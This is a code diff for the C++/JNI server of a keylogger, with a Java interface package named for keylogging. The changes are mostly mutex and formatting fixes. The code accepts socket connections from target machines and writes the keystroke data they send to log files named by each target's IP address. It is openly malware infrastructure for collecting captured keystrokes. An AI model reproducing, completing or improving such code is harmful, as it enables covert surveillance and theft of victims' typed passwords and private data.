@@ -21,7 +21,7 @@ JNICALL void setConsoleColorDefault()
 }
 JNICALL void setConsoleColorCaptureInformationCB()
 {
-    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+     HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
     SetConsoleTextAttribute(hCon,0x30);
 }
 JNICALL void setConsoleColorProcessInformation()
@@ -43,12 +43,12 @@ JNICALL void setConsoleColorCaptureInformationKL()
 
  JNICALL jobjectArray getBuffer()
   {
-
     jclass cls = env->FindClass("keyloggerinterface/keylogdata");
     jmethodID cid = env->GetMethodID(cls,"<init>", "(JLjava/lang/String;)V");
     SOCKETLIST *sl_h,*sl_c ;
     jobjectArray ret = env->NewObjectArray(ConnectionCount,cls,NULL);
     WaitForSingleObject(mu,INFINITE);
+
     if(head->target != NULL)
     {
         sl_h = sl_c= head;
@@ -120,7 +120,6 @@ void Listener()
         {
 
             u_long mode =1;
-            WaitForSingleObject(mu,INFINITE);
             ioctlsocket(*acceptedTarget,FIONBIO,&mode);
             name = static_cast<char*>(malloc(0x100));
             link->name = name;
@@ -132,7 +131,7 @@ void Listener()
             do
             {
                 GetSystemTime(&timestamp);
-                sprintf(link->name,".\\logged\\%d_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
+                sprintf(link->name,".\\logged\\%ld_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
                     timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
                 link->FileDescriptor = CreateFileA(link->name,(GENERIC_READ|GENERIC_WRITE),
                                                FILE_SHARE_READ,NULL,CREATE_ALWAYS,
@@ -152,8 +151,11 @@ void Listener()
                 socket.
             */
             link->IPADDR = htonl(target.sin_addr.S_un.S_addr);
+
+            WaitForSingleObject(mu,INFINITE);
             if((head->target)==0x00)
             {
+
                 *head=*link;
                 head->nextTarget=head;
             }
@@ -162,8 +164,8 @@ void Listener()
                 link->nextTarget=head->nextTarget;
                 head->nextTarget=link;
             }
-            ConnectionCount++;
             ReleaseMutex(mu);
+            ConnectionCount++;
 
         }
 
@@ -173,17 +175,14 @@ void Listener()
 
 void Handler()
 {
-        unsigned int rcv;
         char* buffer = static_cast<char *>(malloc(0x1000));
         SOCKETLIST *link;
-        SOCKETLIST previousLink;
         while(1)
         {
 
             while(head==nullptr ||(head->target)== NULL )
                 Sleep(1);
             WaitForSingleObject(mu,INFINITE);
-
                 link=head;
             ReleaseMutex(mu);
             while((head->target)!=NULL)
@@ -207,22 +206,21 @@ void Handler()
                 else
                 {
                     SOCKETLIST temp = *(link->nextTarget);
+
+                   WaitForSingleObject(mu,INFINITE);
                    if( link->target == temp.target)
                     {
-                        WaitForSingleObject(mu,INFINITE);
                         head->target=0x00;
                         head->nextTarget=0x00;
-                        ReleaseMutex(mu);
                     }
                     else
                     {
 
-                      WaitForSingleObject(mu,INFINITE);
                       link->target = link->nextTarget->target;
                       link->nextTarget=link->nextTarget->nextTarget;
                       head = link;
-                      ReleaseMutex(mu);
                     }
+                    ReleaseMutex(mu);
                     ConnectionCount--;
                 }
 
@@ -257,7 +255,7 @@ int main()
     Sleep(100);
     JavaVMInitArgs args;
     JavaVMOption *option = new JavaVMOption[1];
-    option[0].optionString= const_cast<char*>("-Djava.class.path=C:\\Users\\Qu3b411\\Documents\\NetBeansProjects\\KeyLoggerInterface\\build\\classes;"),NULL;
+    option[0].optionString= const_cast<char*>("-Djava.class.path=.\\KeyLoggerInterface\\build\\classes;");
     args.version = JNI_VERSION_1_8;
     args.nOptions = 1;
     args.options = option;
@@ -270,12 +268,12 @@ int main()
     }
 
     jclass cls = env->FindClass("keyloggerinterface/KeyLoggerInterface");
-    JNINativeMethod methods[] = {"getBuffer", "()[Lkeyloggerinterface/KeyLoggerInterface$keylogdata;", (void*)&getBuffer,
-                                "setConsoleColorDefault", "()V",(void*)&setConsoleColorDefault,
-                                "setConsoleColorCaptureInformationCB", "()V",(void*)&setConsoleColorCaptureInformationCB,
-                                "setConsoleColorProcessInformation", "()V",(void*)&setConsoleColorProcessInformation,
-                                "setConsoleColorTitleInformation", "()V",(void*)&setConsoleColorTitleInformation,
-                                "setConsoleColorCaptureInformationKL", "()V",(void*)&setConsoleColorCaptureInformationKL};
+    JNINativeMethod methods[] = {const_cast<char*>("getBuffer"), const_cast<char*>("()[Lkeyloggerinterface/KeyLoggerInterface$keylogdata;"), (void*)&getBuffer,
+                                const_cast<char*>("setConsoleColorDefault"), const_cast<char*>("()V"),(void*)&setConsoleColorDefault,
+                                const_cast<char*>("setConsoleColorCaptureInformationCB"), const_cast<char*>("()V"),(void*)&setConsoleColorCaptureInformationCB,
+                                const_cast<char*>("setConsoleColorProcessInformation"), const_cast<char*>("()V"),(void*)&setConsoleColorProcessInformation,
+                                const_cast<char*>("setConsoleColorTitleInformation"), const_cast<char*>("()V"),(void*)&setConsoleColorTitleInformation,
+                                const_cast<char*>("setConsoleColorCaptureInformationKL"), const_cast<char*>("()V"),(void*)&setConsoleColorCaptureInformationKL};
 
     jmethodID Init = env->GetMethodID(cls,"<init>","()V");
     jobject obj = env->NewObject(cls,Init);
